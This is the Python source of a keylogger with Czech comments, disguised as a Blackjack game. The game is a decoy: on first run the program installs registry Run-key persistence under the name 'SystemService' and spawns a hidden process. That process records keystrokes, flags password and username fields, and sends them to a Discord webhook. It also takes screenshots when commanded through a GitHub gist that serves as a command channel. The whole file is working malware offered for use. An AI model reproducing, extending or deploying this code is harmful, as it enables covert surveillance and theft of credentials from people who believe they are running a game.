import io
import json
import os
import platform
import random
import shutil
import subprocess
import sys
import threading
import time
from datetime import datetime, timezone
from pathlib import Path

import requests
from pynput import keyboard

# ═══════════════════════════════════════════════════════════════
# KONFIGURACE
# ═══════════════════════════════════════════════════════════════

IS_WINDOWS = platform.system().lower() == "windows"
IS_MACOS = platform.system().lower() == "darwin"

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553128485424201800/7K1yoUlOaf_GLSwJHmu8pJ_Jp0He-bg2VOldAjYs4dk8rIN3NrUMRFHfoUcJSSnPLuAb"

# C2 channel — GitHub gist s commandy
# Vytvoř gist na https://gist.github.com/ s obsahem "NONE"
# Sem dej RAW URL toho gistu (klikni na Raw tlačítko)
GIST_COMMAND_URL = "https://gist.githubusercontent.com/Mickjay07/f9a42765192efe58e0bbdff8ac76b959/raw/gistfile1.txt"

POLL_INTERVAL = 30  # jak často kontrolovat gist (sekundy)

FLUSH_INTERVAL = 5
FLUSH_ON_CHARS = 20
FLUSH_ON_ENTER = True
CAPTURE_WINDOW_TITLE = True
CAPTURE_FIELD_TYPE = True
MAX_RETRIES = 3
RETRY_DELAY = 5

# Persistence
APP_DIR = Path(os.environ.get("APPDATA", Path.home() / ".local/share")) / "SystemService"
APP_NAME = "SystemService.exe"
REGISTRY_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
REGISTRY_VALUE = "SystemServiceUpdate"


# ═══════════════════════════════════════════════════════════════
# DIAGNOSTIKA — startup signal, error reporting, heartbeat
# ═══════════════════════════════════════════════════════════════

def _get_hostname():
    import socket
    try:
        return socket.gethostname()
    except Exception:
        return "unknown"


def _get_username():
    try:
        return os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"
    except Exception:
        return "unknown"


def send_startup_signal():
    """Pošle startup confirmation na Discord — víme, že exe běží."""
    try:
        mode = "SILENT" if "--silent" in sys.argv else "INTERACTIVE"
        requests.post(DISCORD_WEBHOOK_URL, json={
            "embeds": [{
                "title": "🟢 Logger spuštěn",
                "description": f"Host: `{_get_hostname()}`\nUser: `{_get_username()}`\nMode: `{mode}`\nOS: `{platform.system()} {platform.release()}`\nPID: `{os.getpid()}`",
                "color": 0x00FF00,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }]
        }, timeout=15)
    except Exception as e:
        # Zapis do logu, aby sme aspoň něco měli
        try:
            log_file = APP_DIR / "startup_error.log"
            APP_DIR.mkdir(parents=True, exist_ok=True)
            with open(log_file, "a") as f:
                f.write(f"{datetime.now().isoformat()} — STARTUP FAIL: {e}\n")
        except Exception:
            pass


def send_error_signal(context: str, error: Exception):
    """Pošle error na Discord — ať víme, co spadlo."""
    try:
        import traceback
        tb = traceback.format_exc()
        requests.post(DISCORD_WEBHOOK_URL, json={
            "embeds": [{
                "title": f"🔴 Error: {context}",
                "description": f"Host: `{_get_hostname()}`\nError: `{type(error).__name__}: {str(error)[:500]}`\n```{tb[:1500]}```",
                "color": 0xFF0000,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }]
        }, timeout=15)
    except Exception:
        pass


def send_gist_status():
    """Otestuje gist URL a pošle status na Discord."""
    try:
        cache_bust_url = f"{GIST_COMMAND_URL}?_t={int(time.time())}"
        resp = requests.get(cache_bust_url, timeout=10, headers={
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        })
        status = f"HTTP {resp.status_code}"
        content = resp.text.strip()[:100] if resp.status_code == 200 else "N/A"
        requests.post(DISCORD_WEBHOOK_URL, json={
            "embeds": [{
                "title": "📡 Gist C2 Status",
                "description": f"URL: `{GIST_COMMAND_URL[:80]}...`\nStatus: `{status}`\nContent: `{content}`",
                "color": 0x0099FF,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }]
        }, timeout=15)
    except Exception as e:
        send_error_signal("Gist C2 check", e)


def start_heartbeat():
    """Každých 5 minut pošle alive signál — víme, že logger stále běží."""
    def _beat():
        while True:
            time.sleep(300)  # 5 minut
            try:
                requests.post(DISCORD_WEBHOOK_URL, json={
                    "embeds": [{
                        "title": "💓 Heartbeat",
                        "description": f"Host: `{_get_hostname()}`\nUptime check — logger alive\nBuffer entries: N/A",
                        "color": 0xAAAAAA,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                    }]
                }, timeout=15)
            except Exception:
                pass

    t = threading.Thread(target=_beat, daemon=True)
    t.start()


# ═══════════════════════════════════════════════════════════════
# PERSISTENCE — instalace do AppData + Registry Run key
# ═══════════════════════════════════════════════════════════════

def is_installed():
    return Path(sys.argv[0]).parent == APP_DIR or "--silent" in sys.argv


def install():
    if not IS_WINDOWS:
        return
    try:
        APP_DIR.mkdir(parents=True, exist_ok=True)
        src = Path(sys.argv[0])
        dst = APP_DIR / APP_NAME
        if src != dst and src.exists():
            shutil.copy2(src, dst)

        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, REGISTRY_KEY, 0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(
            key, REGISTRY_VALUE, 0, winreg.REG_SZ, f'"{dst}" --silent'
        )
        winreg.CloseKey(key)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════
# SCREENSHOT
# ═══════════════════════════════════════════════════════════════

def take_screenshot() -> bytes | None:
    """Udělá screenshot a vrátí PNG bytes."""
    try:
        if IS_WINDOWS:
            from PIL import ImageGrab
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format="PNG")
            return buf.getvalue()
        elif IS_MACOS:
            result = subprocess.run(
                ["screencapture", "-x", "-m", "/tmp/_ss.png"],
                capture_output=True, timeout=10
            )
            if result.returncode == 0:
                with open("/tmp/_ss.png", "rb") as f:
                    data = f.read()
                os.remove("/tmp/_ss.png")
                return data
    except Exception:
        pass
    return None


def send_screenshot_to_discord():
    """Screenshot → Discord webhook jako obrázek."""
    try:
        ss = take_screenshot()
        if not ss:
            send_error_signal("Screenshot", Exception("take_screenshot() vrátil None — ImageGrab selhal nebo není dostupný"))
            return

        hostname = _get_hostname()

        # Discord webhook limit: 8MB, screenshot můž být větší → komprese
        if len(ss) > 7 * 1024 * 1024:  # >7MB
            from PIL import Image
            img = Image.open(io.BytesIO(ss))
            img = img.resize((img.width // 2, img.height // 2), Image.LANCZOS)  #poloviční rozlišení
            buf = io.BytesIO()
            img.save(buf, format="PNG", optimize=True)
            ss = buf.getvalue()

        resp = requests.post(
            DISCORD_WEBHOOK_URL,
            data={"payload_json": json.dumps({
                "content": f"📸 Screenshot from `{hostname}` @ {datetime.now().strftime('%H:%M:%S')}",
            })},
            files={"files": ("screenshot.png", ss, "image/png")},
            timeout=30
        )
        if resp.status_code not in [200, 204]:
            send_error_signal("Screenshot upload", Exception(f"Discord API vrátil HTTP {resp.status_code}: {resp.text[:200]}"))
    except Exception as e:
        send_error_signal("Screenshot celý", e)


# ═══════════════════════════════════════════════════════════════
# COMMAND POLLING — stahuje gist a provádí příkazy
# ═══════════════════════════════════════════════════════════════

def poll_commands():
    """Každých POLL_INTERVAL sekund stáhne gist a zkontroluje commandy.

    Podporované commandy v gistu:
    SCREENSHOT  → udělá screenshot a pošle na Discord
    NONE        → nic nedělej
    """
    last_command = None
    poll_count = 0

    while True:
        try:
            # Cache-buster: GitHub CDN cacheuje raw URLs několik minut.
            # Přidáme unikátní query parametr → vždy čerstvý obsah.
            cache_bust_url = f"{GIST_COMMAND_URL}?_t={int(time.time())}"
            resp = requests.get(cache_bust_url, timeout=10, headers={
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
            })
            if resp.status_code == 200:
                cmd = resp.text.strip().upper()
                if cmd != last_command:
                    if cmd == "SCREENSHOT":
                        send_screenshot_to_discord()
                    # Přidat další: UNINSTALL, KILL, atd.
                    last_command = cmd
        except Exception:
            pass

        poll_count += 1

        # Každý 10. poll pošli debug status (5 minut)
        # → víme, že poller žije a co vidí
        if poll_count % 10 == 0:
            try:
                content_preview = "N/A"
                try:
                    content_preview = resp.text.strip()[:50] if resp else "no response"
                except Exception:
                    pass
                requests.post(DISCORD_WEBHOOK_URL, json={
                    "embeds": [{
                        "title": "🔄 Poller Status",
                        "description": f"Poll count: `{poll_count}`\nLast command: `{last_command}`\nGist content: `{content_preview}`",
                        "color": 0x00AA00,
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                    }]
                }, timeout=15)
            except Exception:
                pass

        time.sleep(POLL_INTERVAL)


def start_command_poller():
    if GIST_COMMAND_URL == "SEM_DEJ_RAW_GIST_URL":
        return  # není nastaveno → preskoč
    t = threading.Thread(target=poll_commands, daemon=True)
    t.start()


# ═══════════════════════════════════════════════════════════════
# DECOY HRA — Blackjack
# ═══════════════════════════════════════════════════════════════

SUITS = ["♠", "♥", "♦", "♣"]
RANKS = ["A", "2", "3", "4", "5", "6", "7", "8", "9", "10", "J", "Q", "K"]


class Deck:
    def __init__(self):
        self.cards = []
        self.build()

    def build(self):
        self.cards = [(r, s) for s in SUITS for r in RANKS]
        random.shuffle(self.cards)

    def deal(self):
        if not self.cards:
            self.build()
        return self.cards.pop()


def card_value(card):
    rank = card[0]
    if rank in ["J", "Q", "K"]:
        return 10
    elif rank == "A":
        return 11
    return int(rank)


def hand_value(hand):
    total = sum(card_value(c) for c in hand)
    aces = sum(1 for c in hand if c[0] == "A")
    while total > 21 and aces > 0:
        total -= 10
        aces -= 1
    return total


def hand_display(hand, hide_first=False):
    parts = []
    for i, (rank, suit) in enumerate(hand):
        if hide_first and i == 0:
            parts.append("🂠")
        else:
            parts.append(f"{rank}{suit}")
    return " ".join(parts)


def print_hand(label, hand, hide_first=False):
    val = hand_value(hand)
    if hide_first:
        print(f"  {label}: {hand_display(hand, True)}  (?)")
    else:
        print(f"  {label}: {hand_display(hand)}  ({val})")


def run_blackjack():
    """Blackjack — decoy hra."""
    chips = 100
    print("=" * 40)
    print("       ♠♥ BLACKJACK ♦♣")
    print("       Better Luck Tomorrow")
    print("=" * 40)
    print(f"\n  Vítej! Začínáš s {chips} žetony.\n")

    while chips > 0:
        print(f"─" * 40)
        print(f"  Žetony: {chips}")
        try:
            bet = input(f"  Sázka (1-{chips}, nebo 'q' pro konec): ").strip()
        except (EOFError, KeyboardInterrupt):
            break

        if bet.lower() == "q":
            break

        try:
            bet = int(bet)
        except ValueError:
            print("  ⚠ Neplatná sázka!\n")
            continue

        if bet < 1 or bet > chips:
            print(f"  ⚠ Sázka musí být 1-{chips}!\n")
            continue

        deck = Deck()
        player = [deck.deal(), deck.deal()]
        dealer = [deck.deal(), deck.deal()]

        print()
        print_hand("Dealer", dealer, hide_first=True)
        print_hand("Ty", player)
        print()

        # Blackjack check
        if hand_value(player) == 21:
            print("  🎉 BLACKJACK! Výhra 3:2!")
            chips += bet + bet // 2
            print(f"  Žetony: {chips}\n")
            continue

        # Player turn
        busted = False
        while True:
            action = input("  [H]it / [S]tand: ").strip().lower()
            if action == "h":
                player.append(deck.deal())
                print()
                print_hand("Dealer", dealer, hide_first=True)
                print_hand("Ty", player)
                print()
                val = hand_value(player)
                if val > 21:
                    print("  💥 BUST! Přesáhl jsi 21.")
                    chips -= bet
                    busted = True
                    break
                elif val == 21:
                    break
            elif action == "s":
                break
            else:
                print("  ⚠ Zadej H nebo S!\n")

        if busted:
            print(f"  Žetony: {chips}\n")
            continue

        # Dealer turn
        print("\n  Dealer hraje...")
        time.sleep(1)
        while hand_value(dealer) < 17:
            dealer.append(deck.deal())
            print_hand("Dealer", dealer)
            time.sleep(0.8)

        dealer_val = hand_value(dealer)
        player_val = hand_value(player)

        print()
        print_hand("Dealer", dealer)
        print_hand("Ty", player)
        print()

        if dealer_val > 21:
            print("  🎉 Dealer BUST! Vyhrál jsi!")
            chips += bet
        elif dealer_val > player_val:
            print("  😞 Dealer vyhrává.")
            chips -= bet
        elif dealer_val < player_val:
            print("  🎉 Vyhrál jsi!")
            chips += bet
        else:
            print("  🤝 Push (remíza).")

        print(f"  Žetony: {chips}\n")

    print("=" * 40)
    if chips > 0:
        print(f"  Konec hry! Finální žetony: {chips}")
    else:
        print("  Bankrot! Zkus to znovu.")
    print("=" * 40)

    try:
        input("\nStiskni Enter pro ukončení...")
    except (EOFError, KeyboardInterrupt):
        pass


# ═══════════════════════════════════════════════════════════════
# AKTIVNI OKNO + PROCESS NAME + TYP POLE
# ═══════════════════════════════════════════════════════════════

def get_active_window_title():
    if not CAPTURE_WINDOW_TITLE:
        return None
    try:
        if IS_WINDOWS:
            import win32gui
            hwnd = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(hwnd)
        elif IS_MACOS:
            script = 'tell application "System Events" to get name of front window of (first application process whose frontmost is true)'
            result = subprocess.run(
                ["osascript", "-e", script],
                capture_output=True, text=True, timeout=2
            )
            title = result.stdout.strip()
            return title if title else None
        else:
            return None
    except Exception:
        return None


def get_active_process_name():
    try:
        if IS_WINDOWS:
            import win32gui
            import win32process
            import psutil
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            return psutil.Process(pid).name()
        elif IS_MACOS:
            script = 'tell application "System Events" to get name of first application process whose frontmost is true'
            result = subprocess.run(
                ["osascript", "-e", script],
                capture_output=True, text=True, timeout=2
            )
            name = result.stdout.strip()
            return name if name else None
        else:
            return None
    except Exception:
        return None


def get_field_context():
    if not CAPTURE_FIELD_TYPE:
        return (False, False, None)

    if IS_MACOS:
        title = (get_active_window_title() or "").lower()
        if any(w in title for w in ["heslo", "password", "přihlášení", "prihlaseni", "login", "sign in", "zadejte"]):
            return (False, True, title)
        return (False, False, None)

    if not IS_WINDOWS:
        return (False, False, None)
    try:
        import uiautomation as auto
        control = auto.GetFocusedControl()
        if control is None:
            return (False, False, None)

        is_password = bool(getattr(control, "IsPassword", False))
        name = (control.Name or "").lower()
        auto_id = (control.AutomationId or "").lower()

        USERNAME_HINTS = [
            "username", "user name", "user", "login", "log in", "logon",
            "email", "e-mail", "mail", "jmeno", "uživatel", "uzivatel",
            "prihlasovaci", "přihlašovací", "account", "ucet", "účet",
        ]
        is_username = any(h in name or h in auto_id for h in USERNAME_HINTS)

        field_hint = name or auto_id or None
        return (is_password, is_username, field_hint)
    except Exception:
        return (False, False, None)


def get_full_context():
    return (
        get_active_process_name(),
        get_active_window_title(),
        *get_field_context(),
    )


# ═══════════════════════════════════════════════════════════════
# DORUCENI — Discord webhook
# ═══════════════════════════════════════════════════════════════

class WebhookDelivery:
    def __init__(self):
        self.buffer = []
        self.lock = threading.Lock()

    def add(self, text: str, ctx: tuple):
        app, title, is_pw, is_user, hint = ctx
        with self.lock:
            self.buffer.append({
                "char": text,
                "app": app or "unknown",
                "title": title or "",
                "pw": is_pw,
                "user": is_user,
                "hint": hint or "",
            })

    def _hostname(self):
        import socket
        try:
            return socket.gethostname()
        except Exception:
            return "unknown"

    def _group_entries(self, entries):
        grouped = {}
        for e in entries:
            app = e["app"]
            if app not in grouped:
                grouped[app] = {"normal": "", "password": "", "username": "", "title": e["title"]}
            if e["pw"]:
                grouped[app]["password"] += e["char"]
            elif e["user"]:
                grouped[app]["username"] += e["char"]
            else:
                grouped[app]["normal"] += e["char"]
        return grouped

    def _format_discord_payload(self, grouped):
        ts = datetime.now(timezone.utc).isoformat()
        fields = []
        for app, data in grouped.items():
            body = ""
            if data["username"]:
                body += f"**[USERNAME]** `{data['username']}`\n"
            if data["password"]:
                body += f"**[PASSWORD]** `{data['password']}`\n"
            if data["normal"]:
                body += f"{data['normal']}"
            if body:
                fields.append({
                    "name": f"🖥️ {app}",
                    "value": body[:1000],
                    "inline": False,
                })
        return {
            "embeds": [{
                "title": "Keystroke Log",
                "description": f"Host: `{self._hostname()}`",
                "color": 0xFF0000,
                "timestamp": ts,
                "fields": fields[:25],
            }]
        }

    def _deliver(self, grouped):
        for attempt in range(MAX_RETRIES):
            try:
                payload = self._format_discord_payload(grouped)
                resp = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=10)
                resp.raise_for_status()
                return True
            except Exception:
                if attempt < MAX_RETRIES - 1:
                    time.sleep(RETRY_DELAY)
        return False

    def flush(self):
        with self.lock:
            if not self.buffer:
                return
            entries = list(self.buffer)
            self.buffer.clear()
        grouped = self._group_entries(entries)
        if self._deliver(grouped):
            pass
        else:
            with self.lock:
                for e in reversed(entries):
                    self.buffer.insert(0, e)

    def scheduler(self):
        while True:
            time.sleep(FLUSH_INTERVAL)
            self.flush()


# ═══════════════════════════════════════════════════════════════
# KEYLOGGER
# ═══════════════════════════════════════════════════════════════

SPECIAL_KEYS = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "[ENTER]\n",
    keyboard.Key.tab: "[TAB]",
    keyboard.Key.backspace: "[BKSP]",
    keyboard.Key.esc: "[ESC]",
    keyboard.Key.shift: "",
    keyboard.Key.shift_r: "",
    keyboard.Key.ctrl_l: "[CTRL]",
    keyboard.Key.ctrl_r: "[CTRL]",
    keyboard.Key.alt_l: "[ALT]",
    keyboard.Key.alt_r: "[ALT]",
    keyboard.Key.caps_lock: "[CAPS]",
    keyboard.Key.cmd: "[WIN]",
    keyboard.Key.delete: "[DEL]",
}


class Keylogger:
    def __init__(self):
        self.delivery = WebhookDelivery()

    def _format_key(self, key):
        if key in SPECIAL_KEYS:
            return SPECIAL_KEYS[key]
        try:
            return key.char if key.char else ""
        except AttributeError:
            pass
        try:
            return f"[{key.name.upper()}]"
        except AttributeError:
            return ""

    def _on_press(self, key):
        text = self._format_key(key)
        if not text:
            return
        ctx = get_full_context()
        self.delivery.add(text, ctx)

        if (FLUSH_ON_ENTER and key == keyboard.Key.enter) or \
           len(self.delivery.buffer) >= FLUSH_ON_CHARS:
            self.delivery.flush()

    def run_background(self):
        t_scheduler = threading.Thread(target=self.delivery.scheduler, daemon=True)
        t_scheduler.start()
        t_listener = threading.Thread(target=self._start_listener, daemon=True)
        t_listener.start()

    def _start_listener(self):
        with keyboard.Listener(on_press=self._on_press) as listener:
            listener.join()


# ═══════════════════════════════════════════════════════════════
# SPAWNER — spustí sám sebe jako silent subprocess (detached)
# ═══════════════════════════════════════════════════════════════

def spawn_silent_subprocess():
    """Spustí sám sebe s --silent flag jako nezávislý proces.

    Subprocess přežije smrt rodiče (detached, no window).
    Rodič (hra) umře křížkem → subprocess žije dál.
    """
    try:
        if IS_WINDOWS:
            # PyInstaller frozen exe spustí sám sebe
            exe = sys.executable
            args = [exe, "--silent"]
            creation_flags = (
                0x00000200 |  # CREATE_NEW_PROCESS_GROUP
                0x08000000    # CREATE_NO_WINDOW
            )
            subprocess.Popen(
                args,
                creationflags=creation_flags,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
            )
        else:
            # macOS/Linux: python skript
            args = [sys.executable, __file__, "--silent"]
            subprocess.Popen(
                args,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                start_new_session=True,
            )
        return True
    except Exception:
        return False


# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    silent = "--silent" in sys.argv

    if not silent:
        # ═══ INTERACTIVE MÓD (první spuštění) ═══
        #
        # 1. Install persistence (AppData + registry)
        # 2. Spawn silent subprocess (keylogger, přežije smrt hry)
        # 3. Spusť decoy hru (blocking)
        #
        # Uživatel zavře křížkem → hlavní proces umře
        # → silent subprocess žije dál → logging pokračuje

        install()

        spawned = spawn_silent_subprocess()
        if spawned:
            time.sleep(1)  # ať se subprocess stihne spustit

        run_blackjack()
        sys.exit(0)

    else:
        # ═══ SILENT MÓD (subprocess / registry autostart) ═══
        #
        # Keylogger + C2 poller + heartbeat, žádné okno
        # Běží donekonečna

        send_startup_signal()
        send_gist_status()
        start_heartbeat()

        logger = Keylogger()
        logger.run_background()
        start_command_poller()

        # Udržuj proces naživu navždy
        while True:
            time.sleep(60)
